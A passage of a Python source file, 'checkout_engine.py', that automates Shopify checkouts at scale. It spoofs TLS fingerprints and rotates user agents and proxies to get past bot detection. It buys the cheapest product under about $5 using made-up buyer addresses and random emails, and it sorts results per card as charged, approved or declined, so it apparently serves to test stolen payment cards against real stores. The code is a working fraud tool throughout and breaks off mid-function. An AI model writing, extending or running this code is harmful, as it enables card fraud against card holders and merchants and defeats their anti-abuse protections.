# =============================================================================
# checkout_engine.py — API-Less Shopify Checkout Engine (v2.4.0)
# =============================================================================
# Direct Shopify checkout automation. No external API server needed.
# Uses curl_cffi for TLS fingerprint spoofing (required to bypass bot detection).
#
# v2.4.0 (from v2.3.1):
#   - currency + receipt_url returned in public wrapper output
#   - 8 fallback regexes for PollForReceipt (survives JS mutations)
#   - Better proxy 407 classification (reachable but dead)
#   - Split TTL: live proxies 5min, dead proxies 1min
#   - Auto-retry on Step 0 (product fetch) and Step 2 (PAT)
#   - All silent exceptions now logged at debug level
# =============================================================================

import json
import os
import random
import re
import time
import html
import urllib.parse
import threading
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

from curl_cffi.requests import Session
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("vxo")


# ──────────────────────── redaction ──────────────────────────────────

_REDACT_PATTERNS = [
    (re.compile(r'(\b\d{12,19}\b)'), lambda m: "****" + m.group(1)[-4:]),
    (re.compile(r'("sessionToken"\s*:\s*")([^"]{6})[^"]+'), r'\1\2…'),
    (re.compile(r'("sessionId"\s*:\s*")([^"]{6})[^"]+'),    r'\1\2…'),
    (re.compile(r'("receiptId"\s*:\s*")([^"]{6})[^"]+'),    r'\1\2…'),
    (re.compile(r'("queueToken"\s*:\s*")([^"]{6})[^"]+'),   r'\1\2…'),
    (re.compile(r'(pay_[A-Za-z0-9]{6})[A-Za-z0-9]+'),       r'\1…'),
]


def _redact(s: str) -> str:
    if not s:
        return s
    out = s
    for pat, repl in _REDACT_PATTERNS:
        try:
            out = pat.sub(repl, out)
        except Exception:
            pass
    return out


# ──────────────────────── config ─────────────────────────────────────

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107",
                    "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

PROXY_POOL: List[str] = []

_GLOBAL_SEM = threading.Semaphore(int(os.environ.get("SHOPIFY_CONCURRENCY", "8")))


# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


class HardDecline(Exception):
    pass


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False


@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool


@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US":     Address("james",    "anderson",   "428 W 45th St",       "Apt 4B",  "New York",      "US", "NY",  "10036",   "+12125550100", "gmail.com"),
    "CA":     Address("john",     "smith",      "200 Kent St",         "",        "Ottawa",        "CA", "ON",  "K1A0G9",  "+16135550100", "gmail.com"),
    "GB":     Address("james",    "wilson",     "10 Downing St",       "",        "London",        "GB", "ENG", "SW1A2AA", "+442012345678","gmail.com"),
    "AU":     Address("thomas",   "taylor",     "1 George St",         "",        "Sydney",        "AU", "NSW", "2000",    "+61212345678", "gmail.com"),
    "DE":     Address("lucas",    "thomas",     "Friedrichstr 100",    "",        "Berlin",        "DE", "BE",  "10117",   "+493012345678","gmail.com"),
    "FR":     Address("hugo",     "bernard",    "10 Rue de Rivoli",    "",        "Paris",         "FR", "IDF", "75001",   "+33112345678", "gmail.com"),
    "IN":     Address("rahul",    "sharma",     "221B Linking Rd",     "",        "Mumbai",        "IN", "MH",  "400001",  "+919876543210","gmail.com"),
    "AE":     Address("ahmed",    "almansouri", "Sheikh Zayed Road 1", "",        "Dubai",         "AE", "DU",  "12345",   "+97141234567", "gmail.com"),
    "IE":     Address("sean",     "murphy",     "1 Grafton St",        "",        "Dublin",        "IE", "D",   "D02Y006", "+35311234567", "gmail.com"),
    "NL":     Address("bas",      "jansen",     "Dam 1",               "",        "Amsterdam",     "NL", "NH",  "1012JS",  "+31201234567", "gmail.com"),
    "NZ":     Address("jack",     "wilson",     "1 Queen St",          "",        "Auckland",      "NZ", "AUK", "1010",    "+6491234567",  "gmail.com"),
    "JP":     Address("takashi",  "yamamoto",   "1-1-1 Marunouchi",    "",        "Tokyo",         "JP", "13",  "1000005", "+81312345678", "gmail.com"),
    "SG":     Address("wei",      "tan",        "1 Raffles Place",     "#01-01",  "Singapore",     "SG", "01",  "048616",  "+6561234567",  "gmail.com"),
    "HK":     Address("chun",     "wong",       "88 Nathan Road",      "Flat 5A", "Kowloon",       "HK", "KLN", "999077",  "+85255555555", "gmail.com"),
    "CH":     Address("hans",     "weber",      "Bahnhofstrasse 1",    "",        "Zurich",        "CH", "ZH",  "8001",    "+41441234567", "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = ["US", "CA", "GB", "AU", "DE", "FR", "NL", "IE", "NZ"]

EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    c = (country or "").upper()
    if c in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[c]
    if "-" in c:
        base = c.split("-")[0]
        if base in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]


def pick_address_for_store(shop_url: str, currency: str = "USD", country_hint: str = "") -> Address:
    CURRENCY_TO_COUNTRY = {
        "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU",
        "EUR": "DE", "INR": "IN", "AED": "AE", "CHF": "CH",
        "HKD": "HK", "NZD": "NZ", "SGD": "SG", "JPY": "JP",
    }
    tld = (urllib.parse.urlparse(shop_url).hostname or "").split(".")[-1].upper()
    TLD_MAP = {
        "US": "US", "CA": "CA", "UK": "GB", "AU": "AU",
        "DE": "DE", "FR": "FR", "IN": "IN", "AE": "AE",
        "NZ": "NZ", "IE": "IE", "NL": "NL", "JP": "JP",
        "SG": "SG", "HK": "HK", "CH": "CH",
    }
    for candidate in (
        TLD_MAP.get(tld, ""),
        CURRENCY_TO_COUNTRY.get(currency.upper(), ""),
        country_hint.upper(),
        "US",
    ):
        if candidate and candidate in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[candidate]
    return COUNTRY_ADDRESSES["US"]


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result


# ──────────────────────── REAL-CHARGE VERIFIER ───────────────────────

def is_real_charge(poll_body: str) -> Tuple[bool, str]:
    try:
        data = json.loads(poll_body)
    except Exception:
        return False, ""
    receipt = (data.get("data") or {}).get("receipt") or {}
    if not receipt:
        return False, ""
    po = receipt.get("purchaseOrder")
    if not po:
        return False, ""
    total_paid = (
        ((po.get("totalAmountToPay") or {}).get("amount"))
        or ((po.get("checkoutTotal") or {}).get("amount"))
        or ""
    )
    if not total_paid or total_paid in ("0.00", "0", "0.0"):
        return False, ""
    conf = receipt.get("confirmationPage") or {}
    conf_url = conf.get("url") or "" if isinstance(conf, dict) else ""
    if conf_url and "/orders/" in conf_url:
        return True, conf_url
    osp = receipt.get("orderStatusPageUrl") or ""
    if osp and "/orders/" in osp:
        return True, osp
    order_obj = receipt.get("order") or {}
    order_gid = order_obj.get("id") or "" if isinstance(order_obj, dict) else ""
    if not order_gid:
        order_gid = receipt.get("orderId") or ""
    if isinstance(order_gid, str) and order_gid.startswith("gid://shopify/Order/"):
        return True, conf_url or osp or ""
    if total_paid and (po.get("orderNumber") or po.get("name") or po.get("id")):
        return True, conf_url or osp or ""
    return False, ""


# ──────────────────────── Proxy helpers ──────────────────────────────

def normalize_proxy(raw: str) -> str:
    if not raw or not raw.strip():
        raise Exception("empty proxy")

    p = raw.strip()
    for prefix in ("/addproxy", "addproxy", "/proxy", "proxy"):
        if p.lower().startswith(prefix + " "):
            p = p[len(prefix):].strip()
            break
        if p.lower() == prefix:
            raise Exception("empty proxy (command only)")

    p = p.split()[0] if p else ""
    if not p:
        raise Exception("empty proxy after parsing")

    if "://" in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.hostname or not parsed.port:
            raise Exception(f"invalid proxy URL: {raw!r}")
        return p

    if "@" in p:
        return "http://" + p

    parts = p.split(":")
    if len(parts) == 2:
        host, port = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pw = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{user}:{pw}@{host}:{port}"

    raise Exception(f"unsupported proxy format: {raw!r}")


_PROXY_HEALTH_CACHE: Dict[str, float] = {}
_PROXY_HEALTH_LOCK = threading.Lock()
_PROXY_HEALTH_TTL = 300
_PROXY_HEALTH_TTL_DEAD = 60


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    if not proxy_url:
        return True
    now = time.time()
    with _PROXY_HEALTH_LOCK:
        cached_at = _PROXY_HEALTH_CACHE.get(proxy_url)
        if cached_at:
            ttl = _PROXY_HEALTH_TTL if cached_at > 0 else _PROXY_HEALTH_TTL_DEAD
            if abs(now - abs(cached_at)) < ttl:
                return cached_at > 0

    alive = False
    try:
        with Session(proxy=proxy_url, impersonate="chrome124", timeout=timeout) as s:
            r = s.head("https://cdn.shopify.com/", timeout=timeout)
            if r.status_code == 407:
                logger.warning("proxy %s → 407 auth required", proxy_url[:50])
                alive = False
            else:
                alive = 200 <= r.status_code < 500
    except Exception as exc:
        logger.debug("proxy health check failed for %s: %r", proxy_url[:50], exc)
        alive = False

    with _PROXY_HEALTH_LOCK:
        _PROXY_HEALTH_CACHE[proxy_url] = now if alive else -now
    return alive


def pick_next_proxy(current_proxy: str = "") -> str:
    if not PROXY_POOL:
        return current_proxy
    candidates = [p for p in PROXY_POOL if p != current_proxy] or PROXY_POOL
    return random.choice(candidates)


def _load_proxy_pool_from_env() -> None:
    raw = os.environ.get("PROXY_POOL", "").strip()
    if not raw:
        return
    for entry in raw.split(","):
        entry = entry.strip()
        if not entry:
            continue
        try:
            PROXY_POOL.append(normalize_proxy(entry))
        except Exception as exc:
            logger.warning("PROXY_POOL: skipping invalid entry %r (%s)", entry, exc)
    if PROXY_POOL:
        logger.info("PROXY_POOL loaded: %d proxies", len(PROXY_POOL))


# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=30, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url or ""
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent = user_agent
        _session_kwargs = {"impersonate": impersonate, "timeout": timeout}
        if self.proxy_url:
            _session_kwargs["proxy"] = self.proxy_url
        self.session = Session(**_session_kwargs)
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        with _GLOBAL_SEM:
            return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        with _GLOBAL_SEM:
            return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()


# ──────────────────────── Step 0: cheapest product ───────────────────

_recent_prices: Dict[str, List[str]] = {}
_recent_prices_lock = threading.Lock()


def _shuffle_pick_variant(candidates: List[Dict], domain: str) -> Dict:
    if len(candidates) <= 1:
        return candidates[0]
    with _recent_prices_lock:
        recent = _recent_prices.get(domain, [])
        preferred = [v for v in candidates if v["price"] not in recent]
        pick = random.choice(preferred) if preferred else random.choice(candidates)
        updated = list(recent) + [pick["price"]]
        _recent_prices[domain] = updated[-5:]
    return pick


def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.50,
                          max_price: float = 5.00) -> Tuple[str, str, str, str]:
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {500, 502, 503, 504}
    resp = None
    last_err: Optional[Exception] = None

    for attempt in range(1, 4):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning("find_cheapest_product attempt %d/3 network error: %r", attempt, exc)
            if attempt < 3:
                time.sleep(2 + random.random() * 3)
            continue

        if resp.status_code == 200:
            break

        if resp.status_code == 429:
            ra = resp.headers.get("Retry-After")
            try:
                wait = int(ra) if ra and str(ra).isdigit() else 5 + random.random() * 3
            except Exception:
                wait = 5 + random.random() * 3
            wait = min(wait, 30) + random.random()
            logger.warning("find_cheapest_product attempt %d/3: HTTP 429, sleeping %.1fs", attempt, wait)
            last_err = Exception("HTTP 429")
            if attempt < 3:
                time.sleep(wait)
            continue

        if resp.status_code in _RETRYABLE:
            last_err = Exception(f"HTTP {resp.status_code}")
            logger.warning("find_cheapest_product attempt %d/3: HTTP %s", attempt, resp.status_code)
            if attempt < 3:
                time.sleep(2 + random.random() * 3)
            continue

        body_snip = (resp.text or "")[:200].replace("\n", " ")
        raise Exception(f"products.json returned {resp.status_code} (body: {body_snip!r})")
    else:
        raise Exception(f"products.json failed after 3 attempts: {last_err}")

    if resp is None or resp.status_code != 200:
        raise Exception(f"products.json unavailable: {last_err}")

    try:
        products = resp.json().get("products", [])
    except Exception as exc:
        raise Exception(f"products.json: invalid JSON ({exc})")

    if not products:
        raise Exception("No products returned from store")

    in_range: List[Dict] = []
    fallback: List[Dict] = []

    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                continue
            try:
                price_f = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price_f < min_price:
                continue
            entry = {
                "variant_id": str(v["id"]),
                "product_id": str(p["id"]),
                "title": p.get("title", ""),
                "price": v.get("price", ""),
                "price_f": price_f,
            }
            if price_f <= max_price:
                in_range.append(entry)
            fallback.append(entry)

    fallback.sort(key=lambda x: x["price_f"])
    candidates = in_range if in_range else fallback
    if not candidates:
        raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")

    pick = _shuffle_pick_variant(candidates, domain)
    return pick["title"], pick["product_id"], pick["variant_id"], pick["price"]


# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp = client.get(cart_permalink, allow_redirects=True, headers={
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": shop_url + "/",
        "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    })
    if checkout_resp.status_code not in (200, 302):
        body_snip = (checkout_resp.text or "")[:200].replace("\n", " ")
        raise Exception(
            f"cart permalink returned {checkout_resp.status_code} "
            f"(final_url={checkout_resp.url!r}, body={body_snip!r})"
        )
    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text
    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""
    if not checkout_url or "/checkouts/" not in checkout_url:
        raise Exception(f"cart permalink did not redirect to checkout (final_url={checkout_url!r})")
    return checkout_url, checkout_token, session_token, checkout_html


# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""


def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + match.group(1) if match else ""


def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text


def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""


def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""


def extract_poll_for_receipt_id(js_body: str) -> str:
    """Try many regex patterns — Shopify mutates this format often."""
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
        r'query\s+PollForReceipt[^{]{0,200}?([a-f0-9]{64})',
        r'PollForReceipt["\']?\s*[:,]\s*["\']?([a-f0-9]{40,64})',
        r'"operationName"\s*:\s*"PollForReceipt"[^}]{0,300}?([a-f0-9]{64})',
        r'\{\s*id\s*:\s*"([a-f0-9]{64})"\s*,\s*[^}]*PollForReceipt',
        r'PollForReceipt[^\n]{0,400}?([a-f0-9]{32,64})',
    ]
    for p in patterns:
        try:
            match = re.search(p, js_body)
            if match:
                val = match.group(1)
                if len(val) >= 32 and re.fullmatch(r'[a-f0-9]+', val):
                    return val
        except re.error:
            continue
    return ""


# ──────────────────────── Extraction helpers ─────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""


def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True


def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""


def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""


def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""


def extract_identification_signature(checkout_html: str) -> str:
    unescaped = checkout_html.replace('&quot;', '"')
    for pattern in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pattern, unescaped)
        if m:
            return m.group(1)
    return ""


def extract_vault_url(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def extract_vault_domain(checkout_html: str) -> str:
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    if m:
        return m.group(1)
    return ""


def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""


def extract_delivery_handle(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        h = dlv.get("deliveryStrategyHandle", "")
        if h:
            return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles:
                    return handles[0]
    except Exception:
        pass

    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")
        if de_typename == "FilledDeliveryExpectationTerms":
            handles = [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
            if handles:
                return handles
            handles = [x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                       for x in de.get("deliveryExpectations", [])
                       if x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
            if handles:
                return handles
        dlv = seller.get("delivery", {})
        if dlv.get("__typename") == "FilledDeliveryTerms" or de_typename == "FilledDeliveryTerms":
            return []
        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                           for x in expectations
                           if x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
                if handles:
                    return handles
        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms", "PendingTerms"]:
            return []
    except Exception:
        pass
    return []


def extract_shipping_amount(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        delivery = seller.get("delivery", {})
        for line in delivery.get("deliveryLines", []):
            selected = line.get("selectedDeliveryStrategy", {}).get("handle")
            for strat in line.get("availableDeliveryStrategies", []):
                if strat.get("handle") == selected:
                    amt = strat.get("amount", {}).get("value", {}).get("amount")
                    if amt:
                        return amt
    except Exception:
        pass
    m = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body,
    )
    return m.group(1) if m else ""


def extract_checkout_total(proposal_body: str) -> str:
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        for key in ("checkoutTotal", "runningTotal", "total"):
            node = seller.get(key)
            if isinstance(node, dict):
                amt = node.get("value", {}).get("amount") if "value" in node else node.get("amount")
                if amt:
                    return amt
    except Exception:
        pass
    m = re.search(
        r'"sellerProposal".*?"checkoutTotal"\s*:\s*\{[^}]*?"value"\s*:\s*\{[^}]*?"amount"\s*:\s*"([^"]+)"',
        proposal_body, re.DOTALL,
    )
    return m.group(1) if m else ""


def extract_seller_total(proposal_body: str) -> str:
    m = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {})
                   .get("result", {}).get("sellerProposal", {})
                   .get("runningTotal", {}).get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""


def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""


def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""


def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {})
                   .get("result", {}).get("sellerProposal", {})
                   .get("tax", {}).get("totalTaxAmount", {}).get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"


def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""


def extract_receipt_id(submit_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
